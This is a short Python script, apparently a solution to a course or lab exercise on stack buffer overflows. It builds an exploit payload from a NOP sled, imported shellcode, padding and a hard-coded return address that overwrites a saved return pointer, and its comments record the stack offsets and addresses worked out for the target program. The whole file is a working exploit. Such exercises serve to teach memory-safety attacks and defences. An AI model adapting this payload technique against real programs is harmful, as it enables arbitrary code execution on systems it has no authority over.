#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
address = pack('<I', 0xfffe9bb4)
sys.stdout.buffer.write(b'\x90'*400+shellcode+b'\x90'*605+address) # nop sled > 256

# 0x4c offset -> buf starts at 0xfffe9f78 - 1024 = 0xfffe9b78
# 0x10 min offset -> %ebp 0xfffe9fb4 - 1024 = 0xfffe9bb4
# offset instruction: 0x8048961
